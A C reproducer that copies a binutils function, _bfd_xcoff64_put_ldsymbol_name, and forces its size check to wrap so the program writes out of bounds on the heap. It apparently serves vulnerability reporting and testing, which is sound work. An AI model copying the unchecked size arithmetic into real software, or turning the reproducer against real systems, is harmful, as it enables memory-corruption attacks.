// Standalone reproducer for integer-overflow-to-heap-buffer-overflow in
// _bfd_xcoff64_put_ldsymbol_name (bfd/coff64-rs6000.c)

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <stdint.h>
#include <limits.h>

// Minimal type aliases and stubs to match the vulnerable function signature
typedef size_t bfd_size_type;
typedef struct bfd bfd; // Opaque, unused in this path

#ifndef ATTRIBUTE_UNUSED
#define ATTRIBUTE_UNUSED
#endif

static void *bfd_realloc(void *p, bfd_size_type n) {
    return realloc(p, (size_t)n);
}

// Minimal struct definitions to satisfy field accesses used by the function
struct xcoff_loader_info {
    char *strings;
    bfd_size_type string_size;
    bfd_size_type string_alc;
    bool failed;
};

struct internal_ldsym {
    struct {
        struct {
            unsigned long _l_zeroes;
            bfd_size_type _l_offset;
        } _l_l;
    } _l;
};

// Vulnerable function copied with the same logic as in the source context
static bool _bfd_xcoff64_put_ldsymbol_name(bfd *abfd ATTRIBUTE_UNUSED,
                                           struct xcoff_loader_info *ldinfo,
                                           struct internal_ldsym *ldsym,
                                           const char *name) {
    size_t len;
    len = strlen(name);

    if (ldinfo->string_size + len + 3 > ldinfo->string_alc) {
        bfd_size_type newalc;
        char *newstrings;

        newalc = ldinfo->string_alc * 2;
        if (newalc == 0)
            newalc = 32;
        while (ldinfo->string_size + len + 3 > newalc)
            newalc *= 2; // Potential integer overflow here

        newstrings = (char *) bfd_realloc(ldinfo->strings, newalc);
        if (newstrings == NULL) {
            ldinfo->failed = true;
            return false;
        }
        ldinfo->string_alc = newalc;
        ldinfo->strings = newstrings;
    }

    // These writes and the strcpy below can go out-of-bounds if the size check
    // above was bypassed due to integer overflow of string_size + len + 3.
    ldinfo->strings[ldinfo->string_size] = ((len + 1) >> 8) & 0xff;
    ldinfo->strings[ldinfo->string_size + 1] = ((len + 1)) & 0xff;
    strcpy(ldinfo->strings + ldinfo->string_size + 2, name);

    ldsym->_l._l_l._l_zeroes = 0;
    ldsym->_l._l_l._l_offset = ldinfo->string_size + 2;
    ldinfo->string_size += len + 3;

    return true;
}

int main(void) {
    // Set up a tiny strings buffer so any missed reallocation is dangerous
    struct xcoff_loader_info ldinfo;
    ldinfo.string_alc = 64; // very small allocation
    ldinfo.strings = (char *)malloc(ldinfo.string_alc);
    if (!ldinfo.strings) {
        perror("malloc");
        return 1;
    }
    memset(ldinfo.strings, 0x41, ldinfo.string_alc); // fill with 'A'
    ldinfo.failed = false;

    // Choose string_size so that (string_size + len + 3) overflows size_t and
    // becomes a small value <= string_alc. This skips the reallocation,
    // but the subsequent writes use the huge string_size as an index and will
    // write far before the start of the buffer (heap underflow/overflow).
    const char *name = "BBBBBBBBBB"; // len = 10
    size_t len = strlen(name);

    // Make the sum wrap: (SIZE_MAX - 10) + 10 + 3 = SIZE_MAX + 3 -> wraps to 2
    // 2 <= 64, so the if-condition is false and no reallocation occurs.
    ldinfo.string_size = (bfd_size_type)(SIZE_MAX - 10);

    struct internal_ldsym ldsym;
    memset(&ldsym, 0, sizeof(ldsym));

    // This call will perform OOB writes due to the integer overflow in the check
    // and the massive index used in subsequent stores and strcpy.
    (void)_bfd_xcoff64_put_ldsymbol_name(NULL, &ldinfo, &ldsym, name);

    // If AddressSanitizer is enabled, it should report a heap-buffer-overflow/underflow.
    // If the program reaches here without ASan, free and exit.
    free(ldinfo.strings);
    return 0;
}
